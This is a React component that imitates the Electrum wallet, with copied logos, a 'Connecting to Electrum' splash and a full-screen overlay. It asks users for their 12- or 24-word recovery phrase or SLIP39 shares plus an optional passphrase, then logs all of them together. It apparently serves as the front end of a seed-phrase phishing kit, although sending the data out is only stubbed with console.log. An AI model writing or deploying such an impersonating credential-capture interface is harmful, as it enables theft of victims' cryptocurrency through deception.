import { useState, useEffect } from 'react';

interface ElectrumPanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type ViewState = 'splash' | 'select_type' | 'import_seed' | 'import_slip39' | 'passphrase';
type WalletType = 'electrum' | 'bip39' | 'slip39' | null;

export default function ElectrumPanel({ isOpen, onClose }: ElectrumPanelProps) {
  const [view, setView] = useState<ViewState>('splash');
  const [walletType, setWalletType] = useState<WalletType>(null);
  const [phraseLength, setPhraseLength] = useState<12 | 24>(12);
  const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
  const [slip39Share, setSlip39Share] = useState('');
  const [passphrase, setPassphrase] = useState('');
  const [seedError, setSeedError] = useState(false);

  // Reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      setView('splash');
      setWalletType(null);
      setPhraseLength(12);
      setPhraseValues(Array(24).fill(''));
      setSlip39Share('');
      setPassphrase('');
      setSeedError(false);

      const timer = setTimeout(() => setView('select_type'), 2500);
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  const handleWordChange = (index: number, value: string) => {
    const newValues = [...phraseValues];
    newValues[index] = value;
    setPhraseValues(newValues);
    
    if (value.length > 0 && !/^[a-z]+$/.test(value)) {
      setSeedError(true);
    } else {
      setSeedError(false);
    }
  };

  const handleTypeSelection = (type: WalletType) => {
    setWalletType(type);
    setPhraseValues(Array(24).fill(''));
    setSlip39Share('');
    setSeedError(false);
    if (type === 'slip39') {
      setView('import_slip39');
    } else {
      setView('import_seed');
    }
  };

  const isSeedComplete = () => {
    const activeWords = phraseValues.slice(0, phraseLength);
    return activeWords.every(word => word.trim().length > 0) && !seedError;
  };

  const isSlip39Complete = () => {
    return slip39Share.trim().length > 10;
  };

  return (
    <>
      {/* THE FIX: Dynamic pointer-events on the absolute root */}
      <div className={`fixed inset-0 z-[2147483648] font-sans ${isOpen ? 'pointer-events-auto' : 'pointer-events-none'}`}>
        
        {/* Backdrop */}
        <div 
          className={`absolute inset-0 bg-[#12121280] transition-opacity duration-[400ms] ease-in-out ${isOpen ? 'opacity-100' : 'opacity-0'}`} 
          onClick={onClose}
        ></div>
        
        {/* Main Modal */}
        <div className={`flex transition-all duration-[600ms] ease-[cubic-bezier(0.22,1,0.36,1)] fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full max-h-full md:max-w-[620px] md:h-[550px] md:rounded-[24px] overflow-hidden ${isOpen ? 'scale-100 opacity-100' : 'scale-95 opacity-0'}`}>
          <div className="h-full w-full bg-[#ffffff] md:border md:border-transparent shadow-2xl relative flex flex-col">

            {/* ========================================== */}
            {/* LAYER 1: SPLASH SCREEN                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-10 flex flex-col items-center justify-center transition-all duration-700 ease-[cubic-bezier(0.25,1,0.5,1)] bg-white ${view === 'splash' ? 'opacity-100 scale-100' : 'opacity-0 scale-110 blur-sm pointer-events-none'}`}>
              <div className="flex flex-col items-center justify-center p-6">
                <div className="animate-[electrumPulse_2s_ease-in-out_infinite]">
                  <ElectrumLogoSVG className="w-28 h-28 object-contain" />
                </div>
                <div className="mt-12 mb-8 text-center animate-[fadeIn_1s_ease-out_0.3s_both]">
                  <p className="text-[#202020] font-inter font-normal text-[20px]">Connecting to Electrum</p>
                </div>
                <div className="animate-[fadeIn_1s_ease-out_0.5s_both]">
                  <ElectrumTextSVG className="h-6 w-auto text-[#202020]" />
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 2: SELECT WALLET TYPE                */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-20 flex flex-col px-6 py-8 transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] bg-white ${view === 'select_type' ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="flex items-center justify-between shrink-0">
                <ElectrumTextSVG className="h-[35px] w-auto text-[#202020]" />
                <button className="p-1 rounded-[12px] hover:bg-[#f3f3f3] transition-all duration-300 active:scale-95" type="button" onClick={onClose}>
                  <svg className="w-6 h-6 text-[#202020]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg>
                </button>
              </div>
              
              <div className="mt-8 flex flex-col items-start justify-start text-start shrink-0">
                <h3 className="text-[#202020] font-inter font-bold text-[22px]">Select Wallet Type</h3>
                <p className="text-[#141618] font-inter font-normal text-[16px] mt-1.5">Choose your wallet type to continue with the import process.</p>
              </div>

              <div className="w-full mt-6 flex-1 overflow-y-auto">
                <div className="flex flex-col gap-y-3 w-full pb-4">
                  
                  {/* Option 1: Electrum */}
                  <button 
                    onClick={() => handleTypeSelection('electrum')}
                    className="flex items-center justify-between w-full p-4 rounded-[16px] border border-[#ebebeb] bg-[#f3f3f3] hover:opacity-80 transition-all duration-300 active:scale-[0.98]"
                  >
                    <div className="flex items-center gap-x-3">
                      <div className="w-5 h-5 rounded-full border-2 border-[#5a5a5a] flex items-center justify-center"></div>
                      <div className="flex flex-col items-start">
                        <span className="font-medium text-base text-[#202020]">Electrum</span>
                        <span className="font-normal text-sm text-[#666666]">12 or 24 word recovery phrase</span>
                      </div>
                    </div>
                  </button>

                  {/* Option 2: BIP39 */}
                  <button 
                    onClick={() => handleTypeSelection('bip39')}
                    className="flex items-center justify-between w-full p-4 rounded-[16px] border border-[#ebebeb] bg-[#f3f3f3] hover:opacity-80 transition-all duration-300 active:scale-[0.98]"
                  >
                    <div className="flex items-center gap-x-3">
                      <div className="w-5 h-5 rounded-full border-2 border-[#5a5a5a] flex items-center justify-center"></div>
                      <div className="flex flex-col items-start">
                        <span className="font-medium text-base text-[#202020]">BIP39</span>
                        <span className="font-normal text-sm text-[#666666]">12 or 24 word recovery phrase</span>
                      </div>
                    </div>
                  </button>

                  {/* Option 3: SLIP39 */}
                  <button 
                    onClick={() => handleTypeSelection('slip39')}
                    className="flex items-center justify-between w-full p-4 rounded-[16px] border border-[#ebebeb] bg-[#f3f3f3] hover:opacity-80 transition-all duration-300 active:scale-[0.98]"
                  >
                    <div className="flex items-center gap-x-3">
                      <div className="w-5 h-5 rounded-full border-2 border-[#5a5a5a] flex items-center justify-center"></div>
                      <div className="flex flex-col items-start">
                        <span className="font-medium text-base text-[#202020]">SLIP39</span>
                        <span className="font-normal text-sm text-[#666666]">Recovery shares of any length</span>
                      </div>
                    </div>
                  </button>

                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 3A: IMPORT SEED (Electrum/BIP39)     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-30 flex flex-col px-6 py-8 transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] bg-white ${view === 'import_seed' ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="flex items-center justify-between shrink-0">
                <ElectrumTextSVG className="h-[35px] w-auto text-[#202020]" />
                <button className="p-1 rounded-[12px] hover:bg-[#f3f3f3] transition-all duration-300 active:scale-95" type="button" onClick={() => setView('select_type')}>
                  <svg className="w-6 h-6 text-[#202020]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
                </button>
              </div>

              <div className="mt-6 flex flex-col shrink-0">
                <h3 className="text-[#202020] font-inter font-bold text-[22px]">
                  Import {walletType === 'electrum' ? 'Electrum' : 'BIP39'} Wallet
                </h3>
                <p className="text-[#141618] font-inter font-normal text-[16px] mt-1.5">
                  Import an existing wallet with your 12 or 24-word secret phrase.
                </p>
                
                <div className="w-full flex items-center p-1 mt-4 gap-x-1.5 border border-[#ebebeb] rounded-[16px]">
                  <button 
                    onClick={() => { setPhraseLength(12); setPhraseValues(Array(24).fill('')); setSeedError(false); }}
                    className={`flex-1 p-2 rounded-[14px] text-center font-normal text-base transition-all duration-300 ${phraseLength === 12 ? 'border border-[#7b7b7b] bg-[#f3f3f3] text-[#202020]' : 'border border-transparent text-[#666666] hover:bg-[#f9f9f9]'}`}
                  >
                    12 words
                  </button>
                  <button 
                    onClick={() => { setPhraseLength(24); setPhraseValues(Array(24).fill('')); setSeedError(false); }}
                    className={`flex-1 p-2 rounded-[14px] text-center font-normal text-base transition-all duration-300 ${phraseLength === 24 ? 'border border-[#7b7b7b] bg-[#f3f3f3] text-[#202020]' : 'border border-transparent text-[#666666] hover:bg-[#f9f9f9]'}`}
                  >
                    24 words
                  </button>
                </div>
              </div>

              <div className="mt-4 flex-1 overflow-y-auto electrum-custom-scrollbar min-h-0">
                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2 pb-4 pr-1">
                  {Array.from({ length: phraseLength }).map((_, i) => {
                    const isError = phraseValues[i].length > 0 && !/^[a-z]+$/.test(phraseValues[i]);
                    return (
                      <div key={i} className="relative group">
                        <div className="absolute left-[14px] top-[13px] pointer-events-none">
                          <p className="font-inter text-[#202020] text-[13px] font-medium opacity-60 group-focus-within:opacity-100 transition-opacity">{i + 1}</p>
                        </div>
                        <input 
                          className={`w-full h-[44px] py-[11px] pl-[34px] pr-[8px] text-[14px] font-medium rounded-[16px] text-[#222222] border outline-none transition-all duration-300 font-inter ${isError ? 'border-[#ff5252] text-[#fa3434]' : 'border-[#ebebeb] hover:border-[#9d9d9d] bg-transparent focus:bg-[#fbfbfb]'}`} 
                          type="password" 
                          value={phraseValues[i]}
                          onChange={(e) => handleWordChange(i, e.target.value.toLowerCase())}
                        />
                      </div>
                    );
                  })}
                </div>
              </div>

              <div className={`mt-2 transition-opacity duration-300 min-h-[20px] shrink-0 ${seedError ? 'opacity-100' : 'opacity-0'}`}>
                <span className="font-inter text-[#ff5252] font-medium text-[13px]">Check highlighted words for errors.</span>
              </div>

              <div className="mt-2 shrink-0">
                <button 
                  onClick={() => setView('passphrase')}
                  disabled={!isSeedComplete()}
                  className="w-full text-[#ffffff] bg-[#202020] font-medium font-inter text-[15px] rounded-[16px] h-[48px] transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.98]"
                >
                  Continue with wallet
                </button>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 3B: IMPORT SLIP39                    */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-30 flex flex-col px-6 py-8 transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] bg-white ${view === 'import_slip39' ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="flex items-center justify-between shrink-0">
                <ElectrumTextSVG className="h-[35px] w-auto text-[#202020]" />
                <button className="p-1 rounded-[12px] hover:bg-[#f3f3f3] transition-all duration-300 active:scale-95" type="button" onClick={() => setView('select_type')}>
                  <svg className="w-6 h-6 text-[#202020]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
                </button>
              </div>

              <div className="mt-8 flex flex-col items-start shrink-0">
                <h3 className="text-[#202020] font-inter font-bold text-[22px]">Import SLIP39 Recovery Shares</h3>
                <p className="text-[#141618] font-inter font-normal text-[16px] mt-1.5">
                  Enter your SLIP39 recovery shares. You can paste your entire phrase or type it in.
                </p>
              </div>

              <div className="mt-6 flex-1 flex flex-col w-full min-h-0 relative">
                <textarea 
                  className="w-full flex-1 min-h-[120px] p-[16px] text-[15px] font-medium rounded-[16px] text-[#222222] border border-[#ebebeb] hover:border-[#9d9d9d] bg-transparent focus:bg-[#fbfbfb] outline-none transition-all duration-300 font-inter resize-none" 
                  placeholder="Enter your SLIP39 recovery shares here..."
                  value={slip39Share}
                  onChange={(e) => setSlip39Share(e.target.value)}
                ></textarea>
              </div>

              <div className="mt-6 shrink-0">
                <button 
                  onClick={() => setView('passphrase')}
                  disabled={!isSlip39Complete()}
                  className="w-full text-[#ffffff] bg-[#202020] font-medium font-inter text-[15px] rounded-[16px] h-[48px] transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.98]"
                >
                  Continue with wallet
                </button>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 4: PASSPHRASE                        */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-40 flex flex-col px-6 py-8 transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] bg-white ${view === 'passphrase' ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="flex items-center justify-between shrink-0">
                <ElectrumTextSVG className="h-[35px] w-auto text-[#202020]" />
                <button className="p-1 rounded-[12px] hover:bg-[#f3f3f3] transition-all duration-300 active:scale-95" type="button" onClick={() => setView(walletType === 'slip39' ? 'import_slip39' : 'import_seed')}>
                  <svg className="w-6 h-6 text-[#202020]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
                </button>
              </div>

              <div className="mt-8 flex flex-col items-start shrink-0">
                <h3 className="text-[#202020] font-inter font-bold text-[22px]">Add Optional Passphrase</h3>
                <p className="text-[#141618] font-inter font-normal text-[16px] mt-1.5">
                  Enter an optional passphrase for added security. Leave empty if none was set.
                </p>
              </div>

              <div className="mt-8 flex-1 flex flex-col w-full min-h-0 relative">
                <input 
                  className="w-full h-[52px] py-[11px] px-[20px] text-[15px] font-medium rounded-[16px] text-[#222222] border border-[#ebebeb] hover:border-[#9d9d9d] bg-transparent focus:bg-[#fbfbfb] outline-none transition-all duration-300 font-inter" 
                  type="password" 
                  placeholder="Optional passphrase"
                  value={passphrase}
                  onChange={(e) => setPassphrase(e.target.value)}
                />
              </div>

              <div className="mt-6 shrink-0">
                <button 
                  onClick={() => {
                    console.log("Electrum Import Complete:", { type: walletType, data: walletType === 'slip39' ? slip39Share : phraseValues.slice(0, phraseLength), passphrase });
                    onClose();
                  }}
                  className="w-full text-[#ffffff] bg-[#202020] font-medium font-inter text-[15px] rounded-[16px] h-[48px] transition-all duration-300 hover:opacity-90 active:scale-[0.98]"
                >
                  Import Wallet
                </button>
              </div>
            </div>

          </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .electrum-custom-scrollbar::-webkit-scrollbar { width: 4px; }
        .electrum-custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .electrum-custom-scrollbar::-webkit-scrollbar-thumb { background: #d1d1d1; border-radius: 10px; }
        .electrum-custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #a1a1a1; }
        
        @keyframes electrumPulse {
          0%, 100% { opacity: 1; transform: scale(1); }
          50% { opacity: 0.8; transform: scale(0.95); }
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
      `}} />
    </>
  );
}

// -------------------------------------------------------------------
// ELECTRUM SVG COMPONENTS
// -------------------------------------------------------------------

const ElectrumLogoSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 307 328" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M154.599 161.5C216.676 161.5 266.999 136.652 266.999 106C266.999 75.3482 216.676 50.5 154.599 50.5C92.5224 50.5 42.1992 75.3482 42.1992 106C42.1992 136.652 92.5224 161.5 154.599 161.5Z" stroke="#31A6E0" strokeWidth="10.4201" strokeMiterlimit="10"></path>
    <path d="M106.833 134.282C138.468 187.693 185.492 218.329 211.864 202.709C238.237 187.088 233.972 131.128 202.338 77.7168C170.703 24.3059 123.679 -6.32955 97.3064 9.29061C70.9336 24.9108 75.1989 80.8715 106.833 134.282Z" stroke="#31A6E0" strokeWidth="10.4201" strokeMiterlimit="10"></path>
    <path d="M106.806 77.6902C75.1721 131.101 70.9068 187.062 97.2796 202.682C123.652 218.302 170.676 187.667 202.311 134.256C233.945 80.845 238.21 24.8842 211.838 9.26408C185.465 -6.35608 138.441 24.2794 106.806 77.6902Z" stroke="#31A6E0" strokeWidth="10.4201" strokeMiterlimit="10"></path>
    <path d="M168.898 122.897H158.198V130.297H153.698V122.997C152.498 122.997 151.398 122.997 150.098 122.997V130.397H145.598V122.997C144.598 122.997 143.498 122.997 142.398 122.997H136.598L137.498 117.697C137.498 117.697 140.798 117.797 140.798 117.697C142.098 117.697 142.398 116.797 142.498 116.197V95.9969C142.298 95.0969 141.698 93.9969 139.898 93.9969C139.998 93.8969 136.598 93.9969 136.598 93.9969V89.1969H142.798C143.698 89.1969 144.698 89.1969 145.698 89.1969V81.7969H150.198V88.9969C151.398 88.9969 152.598 88.9969 153.798 88.9969V81.7969H158.298V89.1969H168.998C168.998 89.1969 168.998 94.1969 168.998 93.9969H150.398V103.297H165.498V107.797H150.398V117.497H168.098L168.898 122.897Z" fill="currentColor"></path>
    <path d="M34.1984 313.798H7.99844C8.19844 316.198 9.29844 318.198 11.2984 319.698C13.3984 321.198 15.6984 321.898 18.2984 321.898C22.4984 321.898 25.6984 320.598 27.8984 317.898L31.8984 322.298C28.2984 325.998 23.5984 327.898 17.7984 327.898C13.0984 327.898 9.09844 326.298 5.79844 323.198C2.49844 320.098 0.898438 315.898 0.898438 310.598C0.898438 305.298 2.59844 301.198 5.89844 298.098C9.29844 294.998 13.1984 293.398 17.7984 293.398C22.2984 293.398 26.1984 294.798 29.3984 297.498C32.5984 300.198 34.1984 303.998 34.1984 308.798V313.798ZM7.99844 308.298H27.1984C27.1984 305.498 26.2984 303.298 24.5984 301.798C22.7984 300.298 20.6984 299.498 18.0984 299.498C15.4984 299.498 13.1984 300.298 11.1984 301.898C8.99844 303.398 7.99844 305.598 7.99844 308.298Z" fill="currentColor"></path>
    <path d="M52.7969 327.395H45.7969V280.695H52.7969V327.395Z" fill="currentColor"></path>
    <path d="M97.8 313.798H71.6C71.8 316.198 72.9 318.198 74.9 319.698C77 321.198 79.3 321.898 81.9 321.898C86.1 321.898 89.3 320.598 91.5 317.898L95.5 322.298C91.9 325.998 87.2 327.898 81.4 327.898C76.7 327.898 72.7 326.298 69.4 323.198C66.1 320.098 64.5 315.898 64.5 310.598C64.5 305.298 66.2 301.198 69.5 298.098C72.9 294.998 76.8 293.398 81.4 293.398C85.9 293.398 89.8 294.798 93 297.498C96.2 300.198 97.8 303.998 97.8 308.798V313.798ZM71.6 308.298H90.8C90.8 305.498 89.9 303.298 88.2 301.798C86.4 300.298 84.3 299.498 81.7 299.498C79.1 299.498 76.8 300.298 74.8 301.898C72.7 303.398 71.6 305.598 71.6 308.298Z" fill="currentColor"></path>
    <path d="M124.199 327.892C119.499 327.892 115.499 326.292 112.199 323.192C108.799 319.992 107.199 315.892 107.199 310.792C107.199 305.692 108.899 301.492 112.399 298.292C115.899 295.092 120.199 293.492 125.199 293.492C130.199 293.492 134.499 295.192 137.999 298.692L133.899 303.792C130.999 301.292 128.099 299.992 125.199 299.992C122.299 299.992 119.699 300.992 117.599 302.892C115.399 304.792 114.399 307.392 114.399 310.392C114.399 313.392 115.499 316.092 117.599 318.192C119.699 320.292 122.399 321.392 125.499 321.392C128.599 321.392 131.599 319.992 134.299 317.092L138.399 321.592C134.199 325.892 129.499 327.892 124.199 327.892Z" fill="currentColor"></path>
    <path d="M157.999 299.592V316.592C157.999 318.192 158.399 319.492 159.299 320.392C160.099 321.292 161.299 321.792 162.799 321.792C164.299 321.792 165.799 321.092 167.099 319.592L169.999 324.592C167.499 326.792 164.799 327.892 161.799 327.892C158.799 327.892 156.199 326.892 154.099 324.792C151.999 322.692 150.899 319.892 150.899 316.392V299.592H146.699V293.992H150.899V283.492H157.899V293.992H166.699V299.692H157.999V299.592Z" fill="currentColor"></path>
    <path d="M196.898 300.598C193.398 300.598 190.798 301.698 188.998 303.998C187.198 306.298 186.398 309.298 186.398 313.098V327.398H179.398V293.998H186.398V300.698C187.498 298.598 189.098 296.898 190.998 295.498C192.898 294.198 194.998 293.498 197.198 293.398L197.298 300.498C197.198 300.598 197.098 300.598 196.898 300.598Z" fill="currentColor"></path>
    <path d="M231.497 312.092V293.992H238.497V327.392H231.497V321.292C230.397 323.392 228.797 324.992 226.797 326.092C224.797 327.292 222.697 327.892 220.397 327.892C216.597 327.892 213.597 326.692 211.297 324.392C208.997 322.092 207.797 318.792 207.797 314.392V293.992H214.797V312.392C214.797 318.592 217.397 321.592 222.497 321.592C224.897 321.592 226.997 320.792 228.897 319.192C230.597 317.592 231.497 315.192 231.497 312.092Z" fill="currentColor"></path>
    <path d="M259.598 309.292V327.392H252.598V293.992H259.598V300.092C260.598 297.992 262.098 296.392 264.198 295.292C266.198 294.092 268.398 293.492 270.798 293.492C276.098 293.492 279.698 295.692 281.598 299.992C284.898 295.592 288.998 293.492 293.998 293.492C297.798 293.492 300.798 294.692 303.098 296.992C305.398 299.292 306.598 302.592 306.598 306.992V327.492H299.598V309.092C299.598 302.892 296.998 299.892 291.898 299.892C289.498 299.892 287.398 300.692 285.598 302.192C283.798 303.692 282.898 305.992 282.798 308.892V327.492H275.798V309.092C275.798 305.892 275.198 303.592 274.098 302.092C272.998 300.592 271.198 299.892 268.798 299.892C266.398 299.892 264.298 300.692 262.398 302.292C260.498 303.892 259.598 306.192 259.598 309.292Z" fill="currentColor"></path>
  </svg>
);

const ElectrumTextSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 249 48" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 24C0 10.745 10.055 0 22.459 0H79.541C91.945 0 102 10.745 102 24C102 37.255 91.945 48 79.541 48H22.459C10.055 48 0 37.255 0 24Z" fill="currentColor"></path>
    <path d="M70.1064 29.874V18.786H72.0644V20.458C72.7684 19.226 74.1984 18.5 75.7824 18.5C78.1804 18.5 79.8524 20.018 79.8524 22.966V29.874H77.9164V23.076C77.9164 21.14 76.8164 20.128 75.2104 20.128C73.4724 20.128 72.0644 21.514 72.0644 23.472V29.874H70.1064ZM57.7614 29.874L55.7154 18.786H57.5634L59.0154 27.938L60.9294 21.91H62.7554L64.6474 27.872L66.1214 18.786H67.9694L65.9234 29.874H63.7234L61.8534 24.11L59.9614 29.874H57.7614ZM49.1134 30.16C45.7474 30.16 43.7674 27.652 43.7674 24.33C43.7674 21.03 45.7474 18.5 49.1134 18.5C52.4794 18.5 54.4594 21.03 54.4594 24.33C54.4594 27.652 52.4794 30.16 49.1134 30.16ZM49.1134 28.532C51.5334 28.532 52.4574 26.464 52.4574 24.308C52.4574 22.174 51.5334 20.128 49.1134 20.128C46.6934 20.128 45.7694 22.174 45.7694 24.308C45.7694 26.464 46.6934 28.532 49.1134 28.532ZM36.8424 30.16C33.5864 30.16 31.5404 27.674 31.5404 24.33C31.5404 21.008 33.5864 18.5 36.8424 18.5C39.5924 18.5 42.0124 20.062 41.7484 24.836H33.5424C33.6964 26.882 34.6424 28.554 36.8424 28.554C38.3164 28.554 39.2844 27.652 39.6144 26.618H41.5504C41.2424 28.466 39.5044 30.16 36.8424 30.16ZM33.5864 23.362H39.8564C39.7024 21.14 38.6684 20.106 36.8424 20.106C34.8404 20.106 33.8504 21.558 33.5864 23.362ZM22.1484 29.874V18.786H24.1504V20.656C24.8544 19.424 26.0644 18.786 27.3184 18.786H29.9804V20.656H27.1644C25.4044 20.656 24.1504 21.8 24.1504 24.022V29.874H22.1484Z" className="fill-white"></path>
    <path d="M115.496 16.6H117.938L120.82 24.608L123.702 16.6H126.144V32H124.208V19.966L121.7 26.632H119.94L117.432 19.966V32H115.496V16.6ZM132.879 32.286C131.764 32.286 130.862 31.9853 130.173 31.384C129.498 30.7827 129.161 29.9907 129.161 29.008C129.161 27.864 129.542 27.05 130.305 26.566C131.082 26.0673 132.05 25.7447 133.209 25.598L135.585 25.29C135.995 25.246 136.274 25.1213 136.421 24.916C136.567 24.7107 136.641 24.454 136.641 24.146V24.124C136.641 23.552 136.435 23.09 136.025 22.738C135.629 22.386 135.035 22.21 134.243 22.21C133.436 22.21 132.798 22.3933 132.329 22.76C131.874 23.112 131.603 23.6327 131.515 24.322H129.557C129.674 23.1927 130.151 22.298 130.987 21.638C131.823 20.9633 132.901 20.626 134.221 20.626C135.673 20.626 136.758 20.9707 137.477 21.66C138.21 22.3493 138.577 23.3247 138.577 24.586V29.954C138.577 30.086 138.621 30.196 138.709 30.284C138.797 30.3573 138.907 30.394 139.039 30.394H139.721V32H138.401C137.873 32 137.469 31.8827 137.191 31.648C136.912 31.3987 136.773 31.0613 136.773 30.636V30.372C136.318 31.0467 135.746 31.538 135.057 31.846C134.367 32.1393 133.641 32.286 132.879 32.286ZM133.385 30.702C134.367 30.702 135.152 30.372 135.739 29.712C136.34 29.052 136.641 28.1793 136.641 27.094V26.324C136.362 26.4707 135.988 26.5807 135.519 26.654L133.583 26.94C132.747 27.072 132.138 27.2993 131.757 27.622C131.375 27.93 131.185 28.3627 131.185 28.92C131.185 29.4773 131.383 29.9173 131.779 30.24C132.175 30.548 132.71 30.702 133.385 30.702ZM143.287 20.912H145.245V22.584C145.597 21.968 146.103 21.4913 146.763 21.154C147.438 20.802 148.171 20.626 148.963 20.626C150.195 20.626 151.178 21.0147 151.911 21.792C152.659 22.5547 153.033 23.6547 153.033 25.092V32H151.097V25.202C151.097 24.2633 150.848 23.5373 150.349 23.024C149.865 22.5107 149.212 22.254 148.391 22.254C147.819 22.254 147.291 22.4007 146.807 22.694C146.323 22.9727 145.942 23.3687 145.663 23.882C145.384 24.3807 145.245 24.9527 145.245 25.598V32H143.287V20.912ZM161 32.286C159.768 32.286 158.778 31.9047 158.03 31.142C157.296 30.3647 156.93 29.2573 156.93 27.82V20.912H158.888V27.71C158.888 28.6633 159.13 29.3967 159.614 29.91C160.098 30.4087 160.758 30.658 161.594 30.658C162.166 30.658 162.686 30.5187 163.156 30.24C163.64 29.9467 164.021 29.5433 164.3 29.03C164.593 28.5167 164.74 27.9447 164.74 27.314V20.912H166.676V32H164.74V30.328C164.373 30.944 163.86 31.428 163.2 31.78C162.54 32.1173 161.806 32.286 161 32.286ZM173.806 32.286C172.692 32.286 171.79 31.9853 171.1 31.384C170.426 30.7827 170.088 29.9907 170.088 29.008C170.088 27.864 170.47 27.05 171.232 26.566C172.01 26.0673 172.978 25.7447 174.136 25.598L176.512 25.29C176.923 25.246 177.202 25.1213 177.348 24.916C177.495 24.7107 177.568 24.454 177.568 24.146V24.124C177.568 23.552 177.363 23.09 176.952 22.738C176.556 22.386 175.962 22.21 175.17 22.21C174.364 22.21 173.726 22.3933 173.256 22.76C172.802 23.112 172.53 23.6327 172.442 24.322H170.484C170.602 23.1927 171.078 22.298 171.914 21.638C172.75 20.9633 173.828 20.626 175.148 20.626C176.6 20.626 177.686 20.9707 178.404 21.66C179.138 22.3493 179.504 23.3247 179.504 24.586V29.954C179.504 30.086 179.548 30.196 179.636 30.284C179.724 30.3573 179.834 30.394 179.966 30.394H180.648V32H179.328C178.8 32 178.397 31.8827 178.118 31.648C177.84 31.3987 177.7 31.0613 177.7 30.636V30.372C177.246 31.0467 176.674 31.538 175.984 31.846C175.295 32.1393 174.569 32.286 173.806 32.286ZM174.312 30.702C175.295 30.702 176.08 30.372 176.666 29.712C177.268 29.052 177.568 28.1793 177.568 27.094V26.324C177.29 26.4707 176.916 26.5807 176.446 26.654L174.51 26.94C173.674 27.072 173.066 27.2993 172.684 27.622C172.303 27.93 172.112 28.3627 172.112 28.92C172.112 29.4773 172.31 29.9173 172.706 30.24C173.102 30.548 173.638 30.702 174.312 30.702ZM183.775 30.394H188.065V18.206H184.567V16.6H190.023V30.394H194.291V32H183.775V30.394ZM211.302 16.6H213.304V24.52L219.728 16.6H222.148L216.846 22.936L222.412 32H220.168L215.526 24.52L213.304 27.204V32H211.302V16.6ZM224.835 30.35H228.971V22.562H225.275V20.912H230.973V30.35H235.087V32H224.835V30.35ZM228.883 16.6H231.083V19.02H228.883V16.6ZM244.329 32C243.376 32 242.672 31.7947 242.217 31.384C241.763 30.9587 241.535 30.2913 241.535 29.382V22.518H238.235V20.912H241.029C241.176 20.912 241.293 20.868 241.381 20.78C241.484 20.692 241.535 20.5747 241.535 20.428V17.238H243.471V20.912H247.849V22.518H243.471V29.118C243.471 29.5287 243.574 29.844 243.779 30.064C243.985 30.2693 244.322 30.372 244.791 30.372H248.333V32H244.329Z" className="fill-black"></path>
  </svg>
);